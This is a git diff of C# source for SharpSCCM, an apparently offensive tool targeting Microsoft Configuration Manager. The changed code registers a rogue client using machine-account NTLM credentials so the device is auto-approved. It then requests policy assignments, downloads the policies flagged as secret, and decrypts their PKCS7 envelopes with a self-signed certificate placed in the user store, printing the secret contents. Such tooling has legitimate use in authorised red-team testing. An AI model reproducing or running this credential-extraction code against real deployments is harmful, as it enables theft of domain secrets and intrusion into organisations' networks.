@@ -1,10 +1,14 @@
-﻿using System;
+﻿#define TRACE
+using System;
+using System.Collections.Generic;
+using System.Diagnostics;
 using System.IO;
+using System.Linq;
 using System.Net;
 using System.Net.Http;
-using System.Net.Http.Headers;
 using System.Reflection;
 using System.Security.Cryptography;
+using System.Security.Cryptography.Pkcs;
 using System.Security.Cryptography.X509Certificates;
 using System.Text;
 using System.Threading.Tasks;
@@ -12,9 +16,11 @@ using System.Xml;
 
 // Configuration Manager SDK
 using Microsoft.ConfigurationManagement.Messaging.Framework;
-using Microsoft.ConfigurationManagement.Messaging.Framework.Interop;
 using Microsoft.ConfigurationManagement.Messaging.Messages;
 using Microsoft.ConfigurationManagement.Messaging.Sender.Http;
+using Security.Cryptography;
+using OidGroup = System.Security.Cryptography.OidGroup;
+using TripleDESCng = Security.Cryptography.TripleDESCng;
 
 namespace SharpSCCM
 {
@@ -28,7 +34,7 @@ namespace SharpSCCM
             return certificate;
         }
 
-        public static MessageCertificateX509Volatile CreateUserCertificate()
+        public static MessageCertificateX509Volatile CreateUserCertificate(bool store = false)
         {
             // Generate certificate for signing and encrypting messages
             RSA rsaKey = RSA.Create(2048);
@@ -39,6 +45,12 @@ namespace SharpSCCM
             X509Certificate2 certificate2 = certRequest.CreateSelfSigned(DateTimeOffset.Now, DateTimeOffset.Now.AddYears(1));
             certificate2.FriendlyName = "ConfigMgr Client Certificate";
             X509Certificate2 exportedCert = new X509Certificate2(certificate2.Export(X509ContentType.Pfx, string.Empty));
+            if (store)
+            {
+                var x509Store = new X509Store("My", StoreLocation.CurrentUser);
+                x509Store.Open(OpenFlags.MaxAllowed);
+                x509Store.Add(exportedCert);
+            }
             MessageCertificateX509Volatile certificate = new MessageCertificateX509Volatile(exportedCert);
             return certificate;
         }
@@ -57,9 +69,10 @@ namespace SharpSCCM
 
             // Register a new client
             // Use NTLM authentication for the specified machine account to automatically approve the new device record, allowing secret policy retrieval
-            MessageCertificateX509 certificate = CreateUserCertificate();
+            MessageCertificateX509 certificate = CreateUserCertificate(true);
             // Using a certificate store because Microsoft.ConfigurationManagement.Messaging.Framework.Interop.Internal.DecryptMessage does not support the use of volatile certificates
-            //MessageCertificateX509 certificate = MessageCertificateX509.CreateAndStoreSelfSignedCertificate("ConfigMgr Client Signing and Encryption", "ConfigMgr Client Signing and Encryption", "Personal", StoreLocation.CurrentUser, new [] {"1.3.6.1.4.1.311.101.2", "1.3.6.1.4.1.311.101"}, DateTime.Now, DateTime.Now.AddMonths(6));
+            //MessageCertificateX509 certificate = MessageCertificateX509.CreateAndStoreSelfSignedCertificate("ConfigMgr Client Signing and Encryption", "ConfigMgr Client Signing and Encryption", "My", StoreLocation.CurrentUser, new [] {"1.3.6.1.4.1.311.101.2", "1.3.6.1.4.1.311.101"}, DateTime.Now, DateTime.Now.AddMonths(6));
+
             string authenticationType = "Windows";
             SmsClientId clientId = RegisterClient(certificate, null, server, sitecode, authenticationType, computer, password);
 
@@ -81,7 +94,7 @@ namespace SharpSCCM
             ConfigMgrPolicyAssignmentReply assignmentReply = assignmentRequest.SendMessage(sender);
             Console.WriteLine($"[+] Found {assignmentReply.ReplyAssignments.PolicyAssignments.Count} policy assignments");
 
-            // Can't figure out how to authenticate with the SDK so using raw HTTP requests
+            // Get secret policies
             foreach (PolicyAssignment policyAssignment in assignmentReply.ReplyAssignments.PolicyAssignments)
             {
                 if (policyAssignment.Policy.Flags.ToString().Contains("Secret"))
@@ -91,38 +104,37 @@ namespace SharpSCCM
                     Console.WriteLine($"    Flags: {policyAssignment.Policy.Flags}");
                     Console.WriteLine($"    URL: {policyAssignment.Policy.Location.Value}");
 
+                    // Can't figure out how to authenticate with the SDK so using raw HTTP requests
                     string policyURL = policyAssignment.Policy.Location.Value.Replace("<mp>", server);
                     HttpResponseMessage policyDownloadResponse = SendPolicyDownloadRequest(policyURL, clientId.ToString(), certificate);
-                    string policyDownloadResponseEncryptedText = await policyDownloadResponse.Content.ReadAsStringAsync();
-                    Console.WriteLine($"[+] Received encrypted secret policy from server:\n    {policyDownloadResponseEncryptedText}");
+                    byte[] policyDownloadResponseBytes = await policyDownloadResponse.Content.ReadAsByteArrayAsync();
+                    Console.WriteLine($"[+] Received encoded response from server for policy {policyAssignment.Policy.Id}");
+                    File.WriteAllBytes("C:\\Users\\cave.johnson.APERTURE\\Desktop\\asn1.bin", policyDownloadResponseBytes);
 
+                    // Parse response ASN1 and decrypt contents
+                    ContentInfo contentInfo = new ContentInfo(policyDownloadResponseBytes);
+                    EnvelopedCms pkcs7EnvelopedCms = new EnvelopedCms(contentInfo);
+                    pkcs7EnvelopedCms.Decode(policyDownloadResponseBytes);
+                    RecipientInfoCollection recipientInfos = pkcs7EnvelopedCms.RecipientInfos;
+                    pkcs7EnvelopedCms.Decrypt(recipientInfos[0]);
+                    Console.WriteLine(Encoding.ASCII.GetString(pkcs7EnvelopedCms.ContentInfo.Content));
                     Console.WriteLine("---");
+
                     /*
+                    // Code borrowed from SetCustomHeader method
                     ConfigMgrPolicyBodyDownloadRequest policyDownloadRequest = new ConfigMgrPolicyBodyDownloadRequest(assignmentReply, policyAssignment);
-                    policyDownloadRequest.AddCertificateToMessage(certificate,
-                        CertificatePurposes.Signing | CertificatePurposes.Encryption);
+                    Dictionary<string, object> senderProperty = (Dictionary<string, object>)policyDownloadRequest.Settings.SenderProperties["HttpSender", "HttpHeaders"];
+                    string clientTokenHeader = $"{clientId};{TimeHelpers.CurrentTimeAsIso8601};2";
+                    senderProperty["ClientToken"] = clientTokenHeader;
+                    senderProperty["ClientTokenSignature"] = certificate.Sign(clientTokenHeader + "\0", MessageCertificateSigningOptions.CryptNoHashId).HexBinaryEncode().ToUpperInvariant();
                     policyDownloadRequest.DownloadSecrets = true;
-                    policyDownloadRequest.ForceSmsIdSignature = true;
-                    //Console.WriteLine($"[+] Headers:\n    {policyDownloadRequest.Settings.SenderProperties["HttpHeaders"]}");
-                    ConfigMgrPolicyBodyDownloadReply policyDownloadReply = policyDownloadRequest.SendMessage(sender);
-                    foreach (PolicyBody policyBody in policyDownloadReply.ReplyPolicyBodies)
-                    {
-                        Console.WriteLine(policyBody.RawPolicyText);
-                    }
+                    ConfigMgrPolicyBodyDownloadReply policyBodyDownloadReply = policyDownloadRequest.SendMessage(sender);
                     */
                 }
             }
             
+            
             //Console.WriteLine($"[+] Policy assignment reply body:\n {assignmentReply.Body}");
-
-            // Create request to download the body of the assigned policies
-            // Reflection required to access internal method
-            //ConfigMgrPolicyBodyDownloadRequest policyDownloadRequest = new ConfigMgrPolicyBodyDownloadRequest(assignmentReply);
-            //MethodInfo SetCustomHeader = typeof(ConfigMgrPolicyBodyDownloadRequest).GetMethod("SetCustomHeader", BindingFlags.Instance | BindingFlags.NonPublic);
-            //policyDownloadRequest = Activator.CreateInstance(typeof(ConfigMgrPolicyBodyDownloadRequest));
-            //SetCustomHeader.Invoke(policyDownloadRequest, new object[] { assignmentReply.Settings, clientId, certificate });
-            //MethodInfo SendMessage = typeof(ConfigMgrPolicyBodyDownloadRequest).GetMethod("SendMessage", BindingFlags.Instance | BindingFlags.NonPublic);
-            //ConfigMgrPolicyBodyDownloadReply policyDownloadReply = (ConfigMgrPolicyBodyDownloadReply)SendMessage.Invoke((ConfigMgrPolicyBodyDownloadRequest)policyDownloadRequest, new object[] { sender });
 
             //ConfigMgrPolicyBodyDownloadRequest policyDownloadRequest = new ConfigMgrPolicyBodyDownloadRequest(assignmentReply);
 
